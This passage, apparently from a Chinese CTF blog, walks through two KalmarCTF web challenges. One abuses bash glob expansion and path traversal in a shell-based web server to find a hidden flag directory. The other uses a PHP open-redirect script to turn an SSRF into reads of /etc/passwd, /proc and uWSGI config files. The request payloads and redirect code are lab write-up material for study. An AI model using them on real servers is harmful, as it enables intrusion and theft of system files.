]]; <span class="keyword">then</span></span><br><span class="line">request_headers[<span class="variable">$header_name</span>]=<span class="string">&quot;<span class="variable">$&#123;request_headers[$header_name]&#125;</span>, <span class="variable">$header_value</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">request_headers[<span class="variable">$header_name</span>]=<span class="string">&quot;<span class="variable">$header_value</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">body_length=<span class="variable">$&#123;request_headers[&quot;content-length&quot;]:-0&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ ! <span class="variable">$body_length</span> =~ ^[0-9]+$ ]]; <span class="keyword">then</span></span><br><span class="line">abort <span class="string">&quot;Invalid Content-Length&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -N <span class="variable">$body_length</span> request_body</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">handle_request</span></span>() &#123;</span><br><span class="line"><span class="comment"># Default: serve from static directory</span></span><br><span class="line">path=<span class="string">&quot;/app/static<span class="variable">$uri</span>&quot;</span></span><br><span class="line">path_last_character=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$path</span>&quot;</span> | <span class="built_in">tail</span> -c 1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$path_last_character</span>&quot;</span> == <span class="string">&#x27;/&#x27;</span> ]; <span class="keyword">then</span></span><br><span class="line">path=<span class="string">&quot;<span class="variable">$&#123;path&#125;</span>index.html&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$path</span>&quot;</span> &gt; /dev/null; <span class="keyword">then</span></span><br><span class="line">status=<span class="string">&quot;404 Not Found&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">mime_type=$(file --mime-type -b <span class="string">&quot;<span class="variable">$path</span>&quot;</span>)</span><br><span class="line">file_size=$(<span class="built_in">stat</span> --<span class="built_in">printf</span>=<span class="string">&quot;%s&quot;</span> <span class="string">&quot;<span class="variable">$path</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">response_headers[<span class="string">&quot;Content-Type&quot;</span>]=<span class="string">&quot;<span class="variable">$mime_type</span>&quot;</span></span><br><span class="line">response_headers[<span class="string">&quot;Content-Length&quot;</span>]=<span class="string">&quot;<span class="variable">$file_size</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">write_headers</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$path</span>&quot;</span> 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">receive_request</span><br><span class="line">handle_request</span><br></pre></td></tr></table></figure><p>由于是shell语言这里我想到了一些shell中的一些骚操作例如：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;变量名&#125;  #会将变量的值进行拓展出来</span><br><span class="line">$(命令)  #会执行（）中的命令</span><br><span class="line">`命令`  #会执行` `中的命令</span><br></pre></td></tr></table></figure><details class="folding-tag" open><summary> 拓展：shell语言中的部分特性 </summary>              <div class='content'>              <p><strong>特性1：展开</strong></p><p>按照展开顺序分为：</p><ol><li>花括号展开（Brace Expansion）：<br>花括号展开可以用来生成一系列具有相似结构的字符串。例如，使用花括号展开可以生成一组文件名或者一组命令参数。</li></ol><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#123;a,b,c&#125;</span><br><span class="line">a b c</span><br><span class="line"></span><br><span class="line">$ echo file&#123;1..3&#125;.txt</span><br><span class="line">file1.txt file2.txt file3.txt</span><br></pre></td></tr></table></figure><ol start="2"><li>波浪线展开（Tilde Expansion）：<br>波浪线展开用于扩展波浪线后面的特殊字符，通常用于表示用户的主目录路径。</li></ol><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ echo ~</span><br><span class="line">/home/username</span><br><span class="line"></span><br><span class="line">$ echo ~/Documents</span><br><span class="line">/home/username/Documents</span><br></pre></td></tr></table></figure><ol start="3"><li>参数，变量，算术展开和命令替换：<br>参数展开用于访问脚本或函数的参数，变量展开用于展开变量的值，算术展开用于进行数学运算，而命令替换用于将命令的输出作为展开结果。</li></ol><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ echo $HOME</span><br><span class="line">/home/username</span><br><span class="line"></span><br><span class="line">$ echo $((2 + 2))</span><br><span class="line">4</span><br><span class="line"></span><br><span class="line">$ echo $(ls)</span><br><span class="line">file1.txt file2.txt file3.txt</span><br></pre></td></tr></table></figure><ol start="4"><li>单词分割（Word Splitting）：<br>单词分割用于将字符串按照特定的分隔符进行拆分，常见的分隔符包括空格、制表符和换行符。</li></ol><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ string=&quot;Hello World&quot;</span><br><span class="line">$ echo $string</span><br><span class="line">Hello World</span><br><span class="line"></span><br><span class="line">$ for word in $string; do echo $word; done</span><br><span class="line">Hello</span><br><span class="line">World</span><br></pre></td></tr></table></figure><ol start="5"><li>文件名展开（Filename Expansion）：<br>文件名展开用于匹配文件系统中的文件名模式，常见的通配符包括星号（*）和问号（?）。</li></ol><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls *.txt</span><br><span class="line">file1.txt file2.txt file3.txt</span><br><span class="line"></span><br><span class="line">$ rm file?.txt</span><br></pre></td></tr></table></figure><p><strong>特性2：单双引号的区别</strong></p><ul><li><p>单引号：</p><p>使用单引号，单引号中的内容一律被视为字符串，不进行转义，无法被扩展，<code>${}</code>、<code>$()</code>、反引号、<code>通配符</code>无法被使用</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo /*</span><br><span class="line">/app /bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /snap /srv /swapfile /sys /tmp /usr /var</span><br><span class="line"></span><br><span class="line">#通配符不会展开</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &#x27;/*&#x27;</span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &#x27;$(date)&#x27;</span><br><span class="line">$(date)</span><br></pre></td></tr></table></figure></li><li><p>双引号：</p><ul><li><strong>变量展开</strong>：双引号内的变量会被展开，即变量的值会替换变量本身。</li><li><strong>命令替换</strong>：双引号内的命令替换（使用<code>$()</code>或反引号&#96;&#96;）会被执行，其输出会替换命令本身。</li><li><strong>通配符不会展开</strong>：双引号内的通配符（如<code>*</code>、<code>?</code>等）不会被作为通配符处理，而是作为普通字符。</li><li><strong>转义字符</strong>：某些特殊字符（如<code>$</code>、<code>反引号</code>、<code>\</code>）可以通过反斜线进行转义以表示其字面意义。</li></ul><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#变量展开</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# path=&quot;*&quot;</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &quot;$&#123;path&#125;&quot;</span><br><span class="line">*</span><br><span class="line"></span><br><span class="line">#命令替换</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &quot;$(date)&quot;</span><br><span class="line">2024年 03月 24日 星期日 16:55:37 CST</span><br><span class="line"></span><br><span class="line">#通配符不会展开</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &quot;*&quot;</span><br><span class="line">*</span><br></pre></td></tr></table></figure></li></ul><p><strong>特性3：变量展开后的字符串</strong></p><p>1.进行变量展开后，通配符不受 <strong>展开前单双引号性质的影响</strong></p><blockquote><p>​只要最后使用变量时，最外层不存在<code>&quot;&quot;</code>即可展开</p></blockquote><p>例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test1</span></span><br><span class="line">path=&#x27;*&#x27;</span><br><span class="line">path_after=&quot;./*&quot;</span><br><span class="line">echo $path_after #变量替换后，最外层也无&quot;&quot;的影响，此时通配符*可被展开</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出结果：./badass_server.sh ./character1.sh ./character2.sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test2</span></span><br><span class="line">path=&#x27;*&#x27;</span><br><span class="line">path_after=&quot;./$path&quot;</span><br><span class="line">echo ”$path_after“ #变量替换后，最外层存在&quot;&quot;的影响，通配符无法展开</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出结果： ./*</span></span><br></pre></td></tr></table></figure><p>2.进行变量展开后，变量展开、命令替换<strong>受最开始赋值时的单双引号影响</strong></p><blockquote><p>​若最开始时使用单引号，无论最后使用变量时，最外层存不存在引号，都无法被展开</p></blockquote><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test1</span></span><br><span class="line">path=&#x27;$(date)&#x27;</span><br><span class="line">path_after=&quot;./$path&quot;</span><br><span class="line">echo $path_after</span><br><span class="line">path_after_after=$path_after</span><br><span class="line">echo $path_after_after</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出结果：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./$(<span class="built_in">date</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./$(<span class="built_in">date</span>)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test2</span></span><br><span class="line">data= date</span><br><span class="line">echo $data</span><br><span class="line">path=&#x27;$&#123;data&#125;&#x27;</span><br><span class="line">path_after=&quot;./$path&quot;</span><br><span class="line">echo $path_after</span><br><span class="line">path_after_after=$path_after</span><br><span class="line">echo $path_after_after</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出结果：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Sun Mar 24 21:29:51     2024</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./<span class="variable">$&#123;data&#125;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./<span class="variable">$&#123;data&#125;</span></span></span><br></pre></td></tr></table></figure>              </div>            </details><p>但经过尝试，发现无法通过控制<code>$path</code>这个值变为<code>$&#123;&#125;</code>使最后的cat返回<strong>命令替换的结果</strong></p><p>预想结果（可以通过cat的报错获取信息，如果这种办法可行剩下的只是空格的绕过）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu/Desktop# url=$(ls)</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# path=&quot;app/static/$url&quot;</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# cat &quot;$path&quot;</span><br><span class="line">cat: &#x27;app/static/1.sh&#x27;$&#x27;\n&#x27;&#x27;2&#x27;: 没有那个文件或目录</span><br></pre></td></tr></table></figure><p>实际结果</p><p><img src="/./KalmarCTF-Web-Replay/image-20240324193741286.png" alt="image-20240324193741286"></p><details class="folding-tag" open><summary> 拓展：shell语言中的部分特性 </summary>              <div class='content'>              <p><strong>特性4：read命令处理字符串</strong></p><p>使用read命令来读取输入的字符串时，所读取的字符串相当于被单引号包围，具有单引号包裹的字符串的特点</p><ul><li><strong>变量不展开</strong>：单引号内的内容都会被当作普通字符串处理，包括变量，它们不会被展开。</li><li><strong>命令不替换</strong>：单引号内的命令不会被执行，即使使用<code>$()</code>或反引号&#96;&#96;。</li><li><strong>通配符不展开</strong>：单引号内的通配符同样不会被展开，被视为普通文本。</li><li><strong>转义字符不工作</strong>：单引号内几乎所有的字符都被视为普通字符，包括反斜线（<code>\</code>），它不具有转义功能。</li></ul><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test1</span></span><br><span class="line">read -d $&#x27;\n&#x27; -a request_line</span><br><span class="line">method=$&#123;request_line[0]&#125;</span><br><span class="line">echo $method</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输入：$(<span class="built_in">ls</span>) $(<span class="built_in">ls</span>) $(<span class="built_in">ls</span>)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出：$(<span class="built_in">ls</span>)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test2</span></span><br><span class="line">request_line=(&quot;$(ls)&quot; &quot;$(ls)&quot;)</span><br><span class="line">method=$&#123;request_line[0]&#125;</span><br><span class="line">echo $method</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出：badass_server.sh bash.md</span></span><br></pre></td></tr></table></figure>              </div>            </details><p>此时发现我们可控点只剩下<code>$protocol</code>变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protocol=$(echo -n &quot;$&#123;request_line[2]&#125;&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;) </span><br><span class="line">if [ $protocol != &#x27;HTTP/1.0&#x27; ] &amp;&amp; [ $protocol != &#x27;HTTP/1.1&#x27; ]; then</span><br><span class="line">abort &#x27;Invalid protocol&#x27;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="逻辑漏洞2："><a href="#逻辑漏洞2：" class="headerlink" title="逻辑漏洞2："></a>逻辑漏洞2：</h4><p><strong>可控原因</strong>：<code>$protocol</code><strong>变量由于使用</strong><code>echo</code><strong>命令，是得read读取后的特性消失，使得</strong><code>$protocol</code><strong>可被拓展</strong></p><p>当我们尝试修改<code>HTTP/1.1</code>为<code>/*</code>时，发现并没有出现<code>Invalid protocol</code></p><details class="folding-tag" open><summary> 拓展：shell语言中的部分特性 </summary>              <div class='content'>              <p><strong>特性4：[]的返回值</strong></p><p>在 shell 中，<code>[]</code> 符号通常用于条件测试。如 <code>if [ CONDITION ]; then ...</code> 这样的语句。在这种用法中，<code>[]</code> 是 <code>[</code> 命令的简写，这实际上是一个指向 <code>test</code> 命令的链接。因此，当你使用 <code>[]</code> 时，实际上是在调用 <code>test</code> 命令来评估一个条件。</p><p><code>test</code> 命令（或其等价的 <code>[</code> 形式）的返回值遵循 shell 命令的通用返回值约定：</p><ul><li><strong>0</strong>：表示测试的条件为<strong>真（true）</strong>。</li><li><strong>1</strong>：表示测试的条件为<strong>假（false）</strong>。。</li><li><strong>&gt;1</strong>：如果出现错误，如语法错误或使用了无效的选项，<code>test</code> 命令可能会返回大于 1 的值。比较特别的是，此时即使设置了<code>set -e</code>也不会退出程序</li></ul>              </div>            </details><h4 id="逻辑漏洞3："><a href="#逻辑漏洞3：" class="headerlink" title="逻辑漏洞3："></a>逻辑漏洞3：</h4><p>将<code>HTTP/1.1</code>替换为<code>/*</code>时，由于通配符展开，最后会出现进行匹配错误，<code>[]</code>返回大于1的结果，<code>&amp;&amp;</code>的两侧结果都是大于0，返回1，因此<strong>认为是假</strong>，此时这个<code>if</code>条件被判定为假，可以继续执行后面内容的代码</p><p>但如果<code>/*</code>匹配到的结果只有一个时，并不会造成匹配错误，而直接返回0，<code>&amp;&amp;</code>的任意一侧结果为0会直接返回0，此时这个<code>if</code>条件被<strong>判定为真</strong></p><p>启动<code>set -x</code>时的详细信息如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ &#x27;[&#x27; badass_server.sh bash.md character1.sh character2.sh file &#x27;!=&#x27; HTTP/1.0 &#x27;]&#x27;</span><br><span class="line">./badass_server.sh: line 63: [: too many arguments</span><br></pre></td></tr></table></figure><p><em>注意：<strong>此时通配符展开并不能认为这个变量是数组</strong>，数组直接使用会利用数组第0个进行匹配，而通配符展开会报错</em></p><p>因此我们可以通过这个点，使用<code>glob</code>通配符<code>[]</code>写入一个已知的字符，不断修改字符，使其最后能匹配到的结果最后有1个以上，页面不出现：<code>Invalid protocol</code>，进行对目录或者文件名的<strong>一步一步匹配</strong>（用这种方法可以确定名称比已知目录少的目录名）</p><p>最初的页面给出了两个目录，需要利用这两个目录，选择一个目录作为已知字符</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>Explore the iceberg<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;a href=&quot;assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;button&gt;Get the flag&lt;/button&gt;</span></span><br><span class="line"><span class="comment">&lt;/a&gt; --&gt;</span></span><br></pre></td></tr></table></figure><p>以<code>26c3f25922f71af3372ac65a75cd3b11</code>作为已知字符为例，所以最后的playload的过程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /../../../../../../etc/passwd /app/static/assets/[29]*</span><br><span class="line">GET /../../../../../../etc/passwd /app/static/assets/[29][6d]*</span><br><span class="line">GET /../../../../../../etc/passwd /app/static/assets/[29][6d][cf]*</span><br><span class="line">........</span><br></pre></td></tr></table></figure><p>最后找到隐藏的目录， <code>9df5256fe48859c91122cb92964dbd66</code> </p><p>估计最后是猜的吧，flag最后的位置是：<code>/app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt</code></p><p>修改url为<code>../../../../../app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt</code>读出<code>kalmar&#123;17b29adf_bash_web_server_was_a_mistake_374add33&#125;</code></p><h2 id="Is-It-Down"><a href="#Is-It-Down" class="headerlink" title="Is It Down"></a>Is It Down</h2><p><em><strong>它是否宕机</strong></em></p><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote><p>In an increasingly online world it is nice to know, if you are the only one being offline or if everybody else are having offline too.</p><p><em>在一个日益在线化的世界中，了解自己是唯一离线还是其他人也处于离线状态是很重要的。</em></p><p>We present to you: Is it down!</p><p><em>我们向您介绍：它是否宕机！</em></p><p>Rumour has it, that a flag is stored somewhere on this server.</p><p><em>有传言称，一个标志位被存储在这台服务器的某个地方。</em></p></blockquote><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><ul><li><code>/proc</code>目录以及子目录的功能及其作用</li><li>Python语言及特性</li><li><code>__pycache__</code>文件夹</li></ul><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>同样的这也是一个<strong>黑盒测试</strong>，看了看页面发现并没有什么提示，可以根据自己的输入的网址进行判断，网址是否在线或者离线</p><p><img src="/./KalmarCTF-Web-Replay/image-20240324232149397.png" alt="image-20240324232149397"></p><p>直接抓包然后repeat看看</p><p><img src="/./KalmarCTF-Web-Replay/image-20240324223950122.png" alt="image-20240324223950122"></p><p>会发现页面出现了我们输入网页的源代码，<strong>相关的漏洞应该就是SSRF</strong></p><p>尝试直接使用<code>file:///etc/passwd</code>试试看，发现页面回显出了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;</span><span class="punctuation">,</span><span class="attr">&quot;success&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>发现只能使用<code>https://</code>开头的链接（<del>是我应该就在这卡住了</del>）</p><p>根据大佬的思路，我们可以尝试一个发生重定向的网址，  <del>无语啦 。。。。。。。。好麻烦，还得自己起个https服务</del></p><p><strong>根据实际的测试发现</strong>：</p><ul><li>如果输入的链接网页存在任何内容，不会跟随着网页重定向</li><li>如果输入的链接网页不存在任何内容，此时会跟随着网页重定向</li></ul><p>例如：</p><p>我们输入网址的响应包为：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Mar 2024 15:00:50 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>162</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>https://t.doruo.cn/14Qqfhjr2</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>此时，不跟随重定向，返回的内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;content&quot;:&quot;&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body bgcolor=\&quot;white\&quot;&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;openresty&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n&quot;,&quot;online&quot;:true,&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure><p><strong>我们自己起一个后端服务</strong>，为了随时更改重定向内容，我们可以设置代码为以下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;wells&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>此时我们使用这个服务，并输入参数<code>?wells=file:///etc/passwd</code>,发现页面返回出来了<code>passwd</code>的文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;content&quot;:&quot;root:x:0:0:root:/root:/bin/ash\\n.........&quot;,&quot;online&quot;:true,&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>此时再次利用<code>/proc</code>目录进行尝试找到后端服务的文件夹位置以及所对应的运行程序</p><p>在<code>/proc/1/cmdline</code>尝试读取后端的运行程序的相关信息<code>uwsgi\\x00--ini\\x00/etc/uwsgi/uwsgi-custom.ini\\x00</code>，可以猜到此时的后端应该是<code>flask</code>，然后再顺藤摸瓜进入到<code>/etc/uwsgi/uwsgi-custom.ini</code>读取配置信息：（美化后）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">uid</span> = www-data</span><br><span class="line"><span class="attr">gid</span> = www-data</span><br><span class="line"><span class="attr">master</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">processes</span> = <span class="number">4</span></span><br><span class="line"><span class="attr">http-socket</span> = <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">5000</span></span><br><span class="line"><span class="attr">chmod-sock</span> = <span class="number">664</span></span><br><span class="line"><span class="attr">vacuum</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">die-on-term</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">wsgi-file</span> = /var/www/keep-dreaming-sonny-boy/app.py</span><br><span class="line"><span class="attr">callable</span> = app</span><br><span class="line"><span class="attr">pythonpath</span> = /usr/local/lib/python3.<span class="number">11</span>/site-packages</span><br></pre></td></tr></table></figure><p>比较重要的信息是：<code>wsgi-file = /var/www/keep-dreaming-sonny-boy/app.py</code>，然后继续顺藤摸瓜找到对应的后端文件读出出来，因为经过了json的转化，变得无敌难看，让狗屁通美化一下最后得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 